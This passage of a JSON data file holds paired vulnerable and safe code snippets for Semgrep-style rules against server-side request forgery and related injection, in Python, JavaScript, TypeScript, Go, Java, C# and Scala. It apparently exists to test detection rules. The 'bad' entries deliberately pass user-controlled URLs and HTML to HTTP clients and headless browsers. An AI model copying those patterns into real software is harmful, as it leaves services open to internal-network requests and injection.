    "code": "import flask\nimport requests\n\napp = flask.Flask(__name__)\n\n@app.route(\"/route_param/<route_param>\")\ndef route_param(route_param):\n    print(\"blah\")\n    # ruleid: ssrf-requests\n    return requests.get(route_param)\n\n@app.route(\"/get_param\", methods=[\"GET\"])\ndef get_param():\n    param = flask.request.args.get(\"param\")\n    # ruleid: ssrf-requests\n    requests.post(param, timeout=10)\n\n@app.route(\"/get_param_concat\", methods=[\"GET\"])\ndef get_param_concat():\n    param = flask.request.args.get(\"param\")\n    # ruleid: ssrf-requests\n    requests.get(param + \"/id\")",
    "language": "python",
    "description": "Flask - SSRF via requests"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "good",
    "code": "import flask\nimport requests\n\napp = flask.Flask(__name__)\n\n@app.route(\"/route_param_ok/<route_param>\")\ndef route_param_ok(route_param):\n    print(\"blah\")\n    # ok: ssrf-requests\n    return requests.get(\"this is safe\")\n\n@app.route(\"/get_param_ok\", methods=[\"GET\"])\ndef get_param_ok():\n    param = flask.request.args.get(\"param\")\n    # ok: ssrf-requests\n    requests.post(\"this is safe\", timeout=10)\n\n@app.route(\"/ok\")\ndef ok():\n    requests.get(\"https://www.google.com\")",
    "language": "python",
    "description": "Flask - safe requests usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
    "code": "from flask import Flask, request\nfrom flask_mail import Mail, Message\n\napp = Flask(__name__)\nmail = Mail(app)\n\n@app.route(\"/reset_password\", methods=[\"POST\"])\ndef reset_password():\n    email = request.form.get(\"email\")\n    if not email:\n        return \"Invalid email\", 400\n    # ruleid: host-header-injection-python\n    reset_link = \"https://\"+request.host+\"reset/\"+request.headers.get('reset_token')\n    msg = Message('Password reset request', recipients=[email])\n    msg.body = \"Please click on the link to reset your password: \" + reset_link\n    mail.send(msg)\n    return \"Password reset email sent!\"",
    "language": "python",
    "description": "Flask - host header injection"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "good",
    "code": "from flask import Flask, request\nfrom flask_mail import Mail, Message\n\napp = Flask(__name__)\nmail = Mail(app)\n\n@app.route(\"/reset_password\", methods=[\"POST\"])\ndef reset_password():\n    email = request.form.get(\"email\")\n    if not email:\n        return \"Invalid email\", 400\n    # ok: host-header-injection-python\n    reset_link = \"https://\"+request.foo+\"reset/\"+request.headers.get('reset_token')\n    msg = Message('Password reset request', recipients=[email])\n    msg.body = \"Please click on the link to reset your password: \" + reset_link\n    mail.send(msg)\n    return \"Password reset email sent!\"",
    "language": "python",
    "description": "Flask - avoid using request.host"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
    "code": "import { Request, Response, NextFunction } from 'express'\n\nconst request = require('request')\n\nmodule.exports = function badNormal () {\n  return (req: Request, res: Response, next: NextFunction) => {\n    const url = \"//\"+req.body.imageUrl\n    const url1 = req.body['imageUrl'] + 123\n    // ruleid: express-ssrf\n    request.get(url)\n    // ruleid: express-ssrf\n    request.get(url1+123)\n\n    // ruleid: express-ssrf\n    request.get(req.body.url)\n    // ruleid: express-ssrf\n    request.get(`${req.query.url}/fooo`)\n    // ruleid: express-ssrf\n    request.get(\"//\"+req.query.url+config_value.url)\n\n    const a = req.body.url\n    // ruleid: express-ssrf\n    request.get(a)\n  }\n}",
    "language": "typescript",
    "description": "Express - SSRF via request library"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "good",
    "code": "import { Request, Response, NextFunction } from 'express'\n\nconst request = require('request')\n\nmodule.exports = function goodNormal () {\n  return (req: Request, res: Response, next: NextFunction) => {\n    // ok: express-ssrf\n    request.get(`https://reddit.com/${req.query.url}/fooo`)\n    // ok: express-ssrf\n    request.get(\"https://google.com/\"+req.query.url)\n    // ok: express-ssrf\n    request.get(config_value.foo+req.query.url)\n    // ok: express-ssrf\n    request.get(config_value.foo+req.body.shouldalsonotcatch)\n  }\n}",
    "language": "typescript",
    "description": "Express - user data only in path, not host"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
    "code": "const puppeteer = require('puppeteer');\n\nconst testFunc = async (userInput) => {\n  const browser = await puppeteer.launch();\n  const page = await browser.newPage();\n\n  // ruleid:puppeteer-goto-injection\n  await page.goto(unverifiedInput());\n\n  const newUrl = userInput;\n  // ruleid:puppeteer-goto-injection\n  await page.goto(newUrl);\n\n  await page.screenshot({path: 'example.png'});\n  await browser.close();\n};",
    "language": "javascript",
    "description": "Puppeteer - goto injection"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "good",
    "code": "const puppeteer = require('puppeteer');\n\nconst testFunc = async (userInput) => {\n  const browser = await puppeteer.launch();\n  const page = await browser.newPage();\n  let url = 'https://hardcoded.url.com'\n  // ok\n  await page.goto('https://example.com');\n\n  // ok\n  await page.goto(url);\n\n  await page.screenshot({path: 'example.png'});\n  await browser.close();\n};",
    "language": "javascript",
    "description": "Puppeteer - hardcoded URL"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
    "code": "const express = require('express')\nconst app = express()\nconst puppeteer = require('puppeteer')\n\napp.get('/', async (req, res) => {\n    const browser = await puppeteer.launch()\n    const page = await browser.newPage()\n    const url = `https://${req.query.name}`\n    // ruleid: express-puppeteer-injection\n    await page.goto(url)\n\n    await page.screenshot({path: 'example.png'})\n    await browser.close()\n    res.send('Hello World!')\n})\n\napp.post('/test', async (req, res) => {\n    const browser = await puppeteer.launch()\n    const page = await browser.newPage()\n    // ruleid: express-puppeteer-injection\n    await page.setContent(`${req.body.foo}`)\n\n    await page.screenshot({path: 'example.png'})\n    await browser.close()\n    res.send('Hello World!')\n})\n\nconst controller = async (req, res) => {\n    const browser = await puppeteer.launch();\n    const page = await browser.newPage();\n    const body = req.body.foo;\n    // ruleid: express-puppeteer-injection\n    await page.setContent('<html>' + body + '</html>');\n\n    await page.screenshot({path: 'example.png'});\n    await browser.close();\n    res.send('Hello World!');\n}",
    "language": "javascript",
    "description": "Express + Puppeteer - combined SSRF"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "good",
    "code": "const express = require('express')\nconst app = express()\nconst puppeteer = require('puppeteer')\n\napp.post('/ok-test', async (req, res) => {\n    const browser = await puppeteer.launch();\n    const page = await browser.newPage();\n    // ok: express-puppeteer-injection\n    await page.goto('https://example.com');\n\n    await page.screenshot({path: 'example.png'});\n    await browser.close();\n    res.send('Hello World!');\n})\n\nconst controller = async (req, res) => {\n    const browser = await puppeteer.launch();\n    const page = await browser.newPage();\n    // ok: express-puppeteer-injection\n    const body = '<div>123</div>';\n    await page.setContent('<html>' + body + '</html>');\n\n    await page.screenshot({path: 'example.png'});\n    await browser.close();\n    res.send('Hello World!');\n}",
    "language": "javascript",
    "description": "Express + Puppeteer - safe usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
    "code": "const phantom = require('phantom');\n\n(async function() {\n  const instance = await phantom.create();\n  const page = await instance.createPage();\n  await page.on('onResourceRequested', function(requestData) {\n    console.info('Requesting', requestData.url);\n  });\n\n  // ruleid: phantom-injection\n  const status = await page.open(input());\n\n  const content = await page.property('content');\n  console.log(content);\n\n  await instance.exit();\n})();\n\n(async function(userInput) {\n  const instance = await phantom.create();\n  const page = await instance.createPage();\n\n  // ruleid: phantom-injection\n  const status = await page.property('content', input());\n\n  // ruleid: phantom-injection\n  await page.setContent(userInput);\n\n  // ruleid: phantom-injection\n  await page.evaluateJavaScript(userInput);\n\n  await instance.exit();\n})();",
    "language": "javascript",
    "description": "Phantom.js - page open injection"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "good",
    "code": "const phantom = require('phantom');\n\n(async function() {\n  const instance = await phantom.create();\n  const page = await instance.createPage();\n\n  // ok: phantom-injection\n  const status = await page.open('https://stackoverflow.com/');\n\n  // ok: phantom-injection\n  var html = '<html>123</html>'\n  const status = await page.property('content', html);\n\n  // ok: phantom-injection\n  var url = 'https://stackoverflow.com/'\n  const status = await page.openUrl(url, {}, {});\n\n  await instance.exit();\n})();",
    "language": "javascript",
    "description": "Phantom.js - hardcoded URLs"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
    "code": "const wkhtmltopdf = require('wkhtmltopdf')\n\n// ruleid: wkhtmltopdf-injection\nwkhtmltopdf(input(), { output: 'vuln.pdf' })\n\nfunction test(userInput) {\n  // ruleid: wkhtmltopdf-injection\n  return wkhtmltopdf(userInput, { output: 'vuln.pdf' })\n}",
    "language": "javascript",
    "description": "wkhtmltopdf - injection"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "good",
    "code": "const wkhtmltopdf = require('wkhtmltopdf')\n\n// ok: wkhtmltopdf-injection\nwkhtmltopdf('<html><html/>', { output: 'vuln.pdf' })\n\nfunction okTest(userInput) {\n   var html = '<html><html/>';\n   // ok: wkhtmltopdf-injection\n   return wkhtmltopdf(html, { output: 'vuln.pdf' })\n}",
    "language": "javascript",
    "description": "wkhtmltopdf - hardcoded content"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
    "code": "var wkhtmltoimage = require('wkhtmltoimage')\n\n// ruleid: wkhtmltoimage-injection\nwkhtmltoimage.generate(input(), { output: 'vuln.jpg' })\n\nfunction test(userInput) {\n    // ruleid: wkhtmltoimage-injection\n    wkhtmltoimage.generate(userInput, { output: 'vuln.jpg' })\n}",
    "language": "javascript",
    "description": "wkhtmltoimage - injection"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "good",
    "code": "var wkhtmltoimage = require('wkhtmltoimage')\n\nconst html = '<html></html>'\n// ok: wkhtmltoimage-injection\nwkhtmltoimage.generate(html, { output: 'vuln.jpg' })",
    "language": "javascript",
    "description": "wkhtmltoimage - hardcoded content"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
    "code": "module.exports = {\n    Query: {\n        requestStatus(parent, args, context, info)\n        {\n            url = args.url\n            const axios = require('axios');\n\n            async function getStatus(url) {\n                try {\n                  // ruleid: apollo-axios-ssrf\n                  const response = await axios.request(url);\n                  console.log(response);\n                  var s = response.status;\n                } catch (error) {\n                  console.error(error);\n                  var s = error.code;\n                }\n                return s;\n              }\n            return getStatus(url);\n        }\n    }\n};",
    "language": "javascript",
    "description": "Apollo + Axios - SSRF"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc handlerIndexFmt(w http.ResponseWriter, r *http.Request) {\n\tclient := &http.Client{}\n\n\tif r.Method == \"POST\" && r.URL.Path == \"/api\" {\n\t\turl := fmt.Sprintf(\"https://%v/api\", r.URL.Query().Get(\"proxy\"))\n\n\t\t// ruleid: tainted-url-host\n\t\tresp, err := client.Post(url, \"application/json\", r.Body)\n\n\t\tif err != nil {\n\t\t\tw.WriteHeader(http.StatusInternalServerError)\n\t\t\treturn\n\t\t}\n\t\tdefer resp.Body.Close()\n\t}\n}\n\nfunc handlerBadFmt(w http.ResponseWriter, r *http.Request) {\n\turls, ok := r.URL.Query()[\"url\"]\n\tif !ok {\n\t\thttp.Error(w, \"url missing\", 500)\n\t\treturn\n\t}\n\n\turl := fmt.Sprintf(\"//%s/path\", urls[0])\n\n\t// ruleid: tainted-url-host\n\tresp, err := http.Get(url)\n\tif err != nil {\n\t\thttp.Error(w, err.Error(), 500)\n\t\treturn\n\t}\n\n\tclient := &http.Client{}\n\n\t// ruleid: tainted-url-host\n\treq2, err := http.NewRequest(\"GET\", url, nil)\n\t_, err2 := client.Do(req2)\n}",
    "language": "go",
    "description": "tainted URL host via fmt.Sprintf"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "good",
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc handlerOkFmt(w http.ResponseWriter, r *http.Request) {\n\tclient := &http.Client{}\n\n\tif r.Method == \"POST\" && r.URL.Path == \"/api\" {\n\t\turl := fmt.Printf(\"https://example.com/%v\", r.URL.Query().Get(\"proxy\"))\n\n\t\t// ok: tainted-url-host\n\t\tresp, err := client.Post(url, \"application/json\", r.Body)\n\n\t\tif err != nil {\n\t\t\tw.WriteHeader(http.StatusInternalServerError)\n\t\t\treturn\n\t\t}\n\t\tdefer resp.Body.Close()\n\t}\n}\n\nfunc handlerOk(w http.ResponseWriter, r *http.Request) {\n\t// ok: tainted-url-host\n\t_, err3 := http.Get(\"https://semgrep.dev\")\n\tif err3 != nil {\n\t\thttp.Error(w, err3.Error(), 500)\n\t\treturn\n\t}\n}",
    "language": "go",
    "description": "fixed host, user data in path only"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
    "code": "package main\n\nimport (\n\t\"net/http\"\n)\n\nfunc handlerIndexAdd(w http.ResponseWriter, r *http.Request) {\n\tclient := &http.Client{}\n\n\tif r.Method == \"POST\" && r.URL.Path == \"/api\" {\n\t\turl := \"https://\" + r.URL.Query().Get(\"proxy\") + \"/api\"\n\n\t\t// ruleid: tainted-url-host\n\t\tresp, err := client.Post(url, \"application/json\", r.Body)\n\n\t\tif err != nil {\n\t\t\tw.WriteHeader(http.StatusInternalServerError)\n\t\t\treturn\n\t\t}\n\t\tdefer resp.Body.Close()\n\t}\n}\n\nfunc handlerBadAdd(w http.ResponseWriter, r *http.Request) {\n\turls, ok := r.URL.Query()[\"url\"]\n\tif !ok {\n\t\thttp.Error(w, \"url missing\", 500)\n\t\treturn\n\t}\n\n\turl := urls[0]\n\n\t// ruleid: tainted-url-host\n\tresp, err := http.Get(url)\n\tif err != nil {\n\t\thttp.Error(w, err.Error(), 500)\n\t\treturn\n\t}\n\n\tclient := &http.Client{}\n\n\t// ruleid: tainted-url-host\n\treq2, err := http.NewRequest(\"GET\", r.URL.Path, nil)\n\t_, err2 := client.Do(req2)\n}",
    "language": "go",
    "description": "tainted URL host via string concatenation"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "good",
    "code": "package main\n\nimport (\n\t\"net/http\"\n)\n\nfunc handlerOkAdd(w http.ResponseWriter, r *http.Request) {\n\tclient := &http.Client{}\n\n\tif r.Method == \"POST\" && r.URL.Path == \"/api\" {\n\t\t// ok: tainted-url-host\n\t\tresp, err := client.Post(\"https://example.com/\"+r.URL.Query().Get(\"proxy\"), \"application/json\", r.Body)\n\n\t\tif err != nil {\n\t\t\tw.WriteHeader(http.StatusInternalServerError)\n\t\t\treturn\n\t\t}\n\t\tdefer resp.Body.Close()\n\t} else {\n\t\tproxy := r.URL.Query()[\"proxy\"]\n\t\turl := \"https://example.com/\" + proxy\n\t\t// ok: tainted-url-host\n\t\tresp, err := client.Post(url, \"application/json\", r.Body)\n\t}\n}",
    "language": "go",
    "description": "user data only in path portion"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
    "code": "package org.sasanlabs.service.vulnerability.ssrf;\n\nimport java.net.URL;\nimport java.net.URLConnection;\nimport org.springframework.web.bind.annotation.RequestParam;\n\n@VulnerableAppRestController(descriptionLabel = \"SSRF_VULNERABILITY\", value = \"SSRFVulnerability\")\npublic class SSRFVulnerability {\n\n    @VulnerableAppRequestMapping(value = LevelConstants.LEVEL_1, htmlTemplate = \"LEVEL_1/SSRF\")\n    public ResponseEntity<GenericVulnerabilityResponseBean<byte[]>> getVulnerablePayloadLevel1(\n            @RequestParam(\"imageurl\") String urlImage) {\n        try {\n            // ruleid: tainted-url-host\n            URL u = new URL(urlImage);\n            URLConnection urlConnection = u.openConnection();\n            byte[] bytes;\n            try (InputStream in = urlConnection.getInputStream()) {\n                bytes = StreamUtils.copyToByteArray(urlConnection.getInputStream());\n            }\n            return new ResponseEntity<>(\n                    new GenericVulnerabilityResponseBean<>(bytes, true), HttpStatus.OK);\n        } catch (Exception e) {\n            LOGGER.error(\"Error fetching URL {}\", urlImage, e);\n        }\n        return new ResponseEntity<>(HttpStatus.BAD_REQUEST);\n    }\n}",
    "language": "java",
    "description": "Spring - tainted URL host"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "good",
    "code": "@RestController\n@RequestMapping(\"/user03\")\npublic class User03Controller {\n\n    @Autowired\n    private RestTemplate restTemplate;\n\n    @GetMapping(\"/get\")\n    public UserDTO get(@RequestParam(\"id\") Integer id) {\n        // ok: tainted-url-host\n        String url = String.format(\"http://%s/user/get?id=%d\", \"demo-provider\", id);\n        return restTemplate.getForObject(url, UserDTO.class);\n    }\n\n    @PostMapping(\"/add\")\n    public Integer add(UserAddDTO addDTO) {\n        HttpHeaders headers = new HttpHeaders();\n        headers.setContentType(MediaType.APPLICATION_JSON);\n        String body = JSON.toJSONString(addDTO);\n        HttpEntity<String> entity = new HttpEntity<>(body, headers);\n        // ok: tainted-url-host\n        String url = String.format(\"http://%s/user/add\", \"demo-provider\");\n        return restTemplate.postForObject(url, entity, Integer.class);\n    }\n}",
    "language": "java",
    "description": "Java - hardcoded host, user data in path"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
    "code": "using System.Net.WebRequest;\nusing System.Uri;\n\nnamespace Ssrf\n{\n    public class Ssrf\n    {\n        // ruleid: ssrf\n        public void WebRequest(string host)\n        {\n            try\n            {\n                WebRequest webRequest = WebRequest.Create(host);\n            }\n            catch (Exception e)\n            {\n                System.Diagnostics.Debug.WriteLine(e);\n            }\n        }\n\n        // ruleid: ssrf\n        public void WebRequestWithStringConcatenation(string host)\n        {\n            String baseUrl = \"constant\" + host;\n            WebRequest webRequest = WebRequest.Create(baseUrl);\n        }\n\n        // ruleid: ssrf\n        public void WebRequestWithUri(string host)\n        {\n            Uri uri = new Uri(host);\n            WebRequest webRequest = WebRequest.Create(uri);\n        }\n    }\n}",
    "language": "csharp",
    "description": "WebRequest with user-controlled URL"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "good",
    "code": "using System.Net.WebRequest;\nusing System.Uri;\n\nnamespace Ssrf\n{\n    public class Ssrf\n    {\n        // ok: ssrf\n        public void WebRequest(string host)\n        {\n            try\n            {\n                WebRequest webRequest = WebRequest.Create(\"constant\");\n            }\n            catch (Exception e)\n            {\n                System.Diagnostics.Debug.WriteLine(e);\n            }\n        }\n\n        // ok: ssrf\n        public void WebRequestWithStringConcatenation(string host)\n        {\n            String baseUrl = \"constant\";\n            WebRequest webRequest = WebRequest.Create(baseUrl);\n        }\n\n        // ok: ssrf\n        public void WebRequestWithUri(string host)\n        {\n            Uri uri = new Uri(\"constant\");\n            WebRequest webRequest = WebRequest.Create(uri);\n        }\n    }\n}",
    "language": "csharp",
    "description": "WebRequest with hardcoded URL"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
    "code": "using System.Net.Http;\n\nnamespace ServerSideRequestForgery\n{\n    public class Ssrf\n    {\n        // ruleid: ssrf\n        public void HttpClientAsync(string host)\n        {\n            HttpClient client = new HttpClient();\n            try\n            {\n                HttpResponseMessage response = client.GetAsync(host).Result;\n            }\n            catch (Exception e)\n            {\n                System.Diagnostics.Debug.WriteLine(e);\n            }\n        }\n\n        // ruleid: ssrf\n        public void HttpClientAsyncWithUri(string host)\n        {\n            Uri uri = new Uri(host);\n            HttpClient client = new HttpClient();\n            try\n            {\n                HttpResponseMessage response = client.GetAsync(uri).Result;\n            }\n            catch (Exception e)\n            {\n                System.Diagnostics.Debug.WriteLine(e);\n            }\n        }\n    }\n}",
    "language": "csharp",
    "description": "HttpClient with user-controlled URL"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "good",
    "code": "using System.Net.Http;\n\nnamespace ServerSideRequestForgery\n{\n    public class Ssrf\n    {\n        // ok: ssrf\n        public void HttpClientAsync(string host)\n        {\n            HttpClient client = new HttpClient();\n            try\n            {\n                HttpResponseMessage response = client.GetAsync(\"constant\").Result;\n            }\n            catch (Exception e)\n            {\n                System.Diagnostics.Debug.WriteLine(e);\n            }\n        }\n\n        // ok: ssrf\n        public void HttpClientAsyncWithUri(string host)\n        {\n            Uri uri = new Uri(\"constant\");\n            HttpClient client = new HttpClient();\n            try\n            {\n                HttpResponseMessage response = client.GetAsync(uri).Result;\n            }\n            catch (Exception e)\n            {\n                System.Diagnostics.Debug.WriteLine(e);\n            }\n        }\n    }\n}",
    "language": "csharp",
    "description": "HttpClient with hardcoded URL"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
    "code": "using System.Net;\n\nnamespace ServerSideRequestForgery\n{\n    public class Ssrf\n    {\n        // ruleid: ssrf\n        public string WebClient(string host)\n        {\n            string result = \"\";\n            try\n            {\n                WebClient client = new WebClient();\n                Stream data = client.OpenRead(host);\n                StreamReader reader = new StreamReader(data);\n                result = reader.ReadToEnd();\n            }\n            catch (Exception e)\n            {\n                System.Diagnostics.Debug.WriteLine(e);\n            }\n            return result;\n        }\n\n        // ruleid: ssrf\n        public string WebClientDownloadString(string host)\n        {\n            string result = \"\";\n            try\n            {\n                WebClient client = new WebClient();\n                Stream data = client.DownloadString(host);\n                StreamReader reader = new StreamReader(data);\n                result = reader.ReadToEnd();\n            }\n            catch (Exception e)\n            {\n                System.Diagnostics.Debug.WriteLine(e);\n            }\n            return result;\n        }\n    }\n}",
    "language": "csharp",
    "description": "WebClient with user-controlled URL"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "good",
    "code": "using System.Net;\n\nnamespace ServerSideRequestForgery\n{\n    public class Ssrf\n    {\n        // ok: ssrf\n        public string WebClient(string host)\n        {\n            string result = \"\";\n            try\n            {\n                WebClient client = new WebClient();\n                Stream data = client.OpenRead(\"constant\");\n                StreamReader reader = new StreamReader(data);\n                result = reader.ReadToEnd();\n            }\n            catch (Exception e)\n            {\n                System.Diagnostics.Debug.WriteLine(e);\n            }\n            return result;\n        }\n\n        // ok: ssrf\n        public string WebClientDownloadString(string host)\n        {\n            string result = \"\";\n            try\n            {\n                WebClient client = new WebClient();\n                Stream data = client.DownloadString(\"constant\");\n                StreamReader reader = new StreamReader(data);\n                result = reader.ReadToEnd();\n            }\n            catch (Exception e)\n            {\n                System.Diagnostics.Debug.WriteLine(e);\n            }\n            return result;\n        }\n    }\n}",
    "language": "csharp",
    "description": "WebClient with hardcoded URL"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
    "code": "using RestSharp;\n\nnamespace ServerSideRequestForgery\n{\n    public class Ssrf\n    {\n        // ruleid: ssrf\n        public void RestClientGet(string host)\n        {\n            try\n            {\n                RestClient client = new RestClient(host);\n                var request = new RestRequest(\"/\");\n                var response = client.Get(request);\n                result = response.Content;\n            }\n            catch (Exception e)\n            {\n                System.Diagnostics.Debug.WriteLine(e);\n            }\n        }\n    }\n}",
    "language": "csharp",
    "description": "RestClient with user-controlled URL"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "good",
    "code": "using RestSharp;\n\nnamespace ServerSideRequestForgery\n{\n    public class Ssrf\n    {\n        // ok: ssrf\n        public void RestClientGet(string host)\n        {\n            try\n            {\n                RestClient client = new RestClient(\"constant\");\n                var request = new RestRequest(\"/\");\n                var response = client.Get(request);\n                result = response.Content;\n            }\n            catch (Exception e)\n            {\n                System.Diagnostics.Debug.WriteLine(e);\n            }\n        }\n    }\n}",
    "language": "csharp",
    "description": "RestClient with hardcoded URL"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
    "code": "package controllers\n\nimport javax.inject._\nimport play.api.libs.ws._\nimport scala.concurrent.Future\n\nobject Smth {\n  def call1(wsClient: WSClient, url: String): Future[Unit] = {\n    // ruleid: webservice-ssrf\n    wsClient.url(url).get().map { response =>\n      val statusText: String = response.statusText\n      println(s\"Got a response $statusText\")\n    }\n  }\n}\n\n@Singleton\nclass HomeController @Inject()(\n  ws: WSClient,\n  val controllerComponents: ControllerComponents,\n  implicit val ec: ExecutionContext\n) extends BaseController {\n\n  def req1(url: String) = Action.async { implicit request: Request[AnyContent] =>\n    // ruleid: webservice-ssrf\n    val futureResponse = ws.url(url).get()\n    futureResponse.map { response =>\n      Ok(s\"it works: ${response.statusText}\")\n    }\n  }\n}",
    "language": "scala",
    "description": "Play WSClient - SSRF"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "good",
    "code": "package controllers\n\nimport javax.inject._\nimport play.api.libs.ws._\nimport scala.concurrent.Future\n\nobject Smth {\n  def call2(wsClient: WSClient): Future[Unit] = {\n    // ok: webservice-ssrf\n    wsClient.url(\"https://www.google.com\").get().map { response =>\n      val statusText: String = response.statusText\n      println(s\"Got a response $statusText\")\n    }\n  }\n}\n\n@Singleton\nclass HomeController @Inject()(\n  ws: WSClient,\n  val controllerComponents: ControllerComponents,\n  implicit val ec: ExecutionContext\n) extends BaseController {\n\n  def req2(url: String) = Action.async { implicit request: Request[AnyContent] =>\n    // ok: webservice-ssrf\n    val futureResponse = ws.url(\"https://www.google.com\").get()\n    futureResponse.map { response =>\n      Ok(s\"it works: ${url}\")\n    }\n  }\n}",
    "language": "scala",
    "description": "Play WSClient - hardcoded URL"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
    "code": "package controllers\n\nimport scala.io.{Codec, Source}\n\nobject Smth {\n  def call1(request_url: String) = {\n    // ruleid: io-source-ssrf\n    val html = Source.fromURI(request_url)\n    val data = html.mkString\n    data\n  }\n}\n\nobject FooBar {\n  def call1(request_url: String, codec: Codec) = {\n    // ruleid: io-source-ssrf\n    val res = Source.fromURL(request_url)(codec).mkString\n    res\n  }\n}",
    "language": "scala",
    "description": "Scala IO Source - SSRF"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "good",
    "code": "package controllers\n\nimport scala.io.{Codec, Source}\n\nobject Smth {\n  def call2() = {\n    // ok: io-source-ssrf\n    val html = Source.fromURI(\"https://www.google.com\")\n    val data = html.mkString\n    data\n  }\n}\n\nobject FooBar {\n  def call2() = {\n    // ok: io-source-ssrf\n    val res = Source.fromURL(\"https://www.google.com\")(codec).mkString\n    res\n  }\n}",
    "language": "scala",
    "description": "Scala IO Source - hardcoded URL"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
    "code": "package controllers\n\nimport dispatch._\nimport Defaults._\n\nobject Smth {\n  def call1(request_url: String): Future[Unit] = {\n    // ruleid: dispatch-ssrf\n    val req = url(request_url)\n    val data = Http.default(req OK as.String)\n    data\n  }\n}\n\nobject FooBar {\n  def call1(request_url: String): Future[Unit] = {\n    // ruleid: dispatch-ssrf\n    val request = url(request_url).POST.setHeader(\"Content-Type\", \"application/json\")\n    val res = Http(request OK as.String)\n    res\n  }\n}",
    "language": "scala",
    "description": "Dispatch HTTP - SSRF"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "good",
    "code": "package controllers\n\nimport dispatch._\nimport Defaults._\n\nobject Smth {\n  def call2(): Future[Unit] = {\n    // ok: dispatch-ssrf\n    val req = url(\"https://www.google.com\")\n    val data = Http.default(req OK as.String)\n    data\n  }\n}\n\nobject FooBar {\n  def call2(): Future[Unit] = {\n    // ok: dispatch-ssrf\n    val request = url(\"https://www.google.com\").POST.setHeader(\"Content-Type\", \"application/json\")\n    val res = Http(request OK as.String)\n    res\n  }\n}",
    "language": "scala",
    "description": "Dispatch HTTP - hardcoded URL"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
    "code": "package controllers\n\nimport scalaj.http.{Http, Token}\n\nobject Smth {\n  def call1(url: String): Future[Unit] = {\n    // ruleid: scalaj-http-ssrf\n    val response: HttpResponse[String] = Http(url).param(\"q\",\"monkeys\").asString\n    response.body\n  }\n}\n\nobject FooBar {\n  def call1(url: String): Future[Unit] = {\n    // ruleid: scalaj-http-ssrf\n    val request = Http(url).postForm(Seq(\"name\" -> \"jon\", \"age\" -> \"29\"))\n    request.asString\n  }\n}",
    "language": "scala",
    "description": "Scalaj HTTP - SSRF"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "good",
    "code": "package controllers\n\nimport scalaj.http.{Http, Token}\n\nobject Smth {\n  def call2(): Future[Unit] = {\n    // ok: scalaj-http-ssrf\n    val response: HttpResponse[String] = Http(\"https://www.google.com\").param(\"q\",\"monkeys\").asString\n    response.body\n  }\n}\n\nobject FooBar {\n  def call2(): Future[Unit] = {\n    // ok: scalaj-http-ssrf\n    val request = Http(\"https://www.google.com\").postForm(Seq(\"name\" -> \"jon\", \"age\" -> \"29\"))\n    request.asString\n  }\n}",
    "language": "scala",
    "description": "Scalaj HTTP - hardcoded URL"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
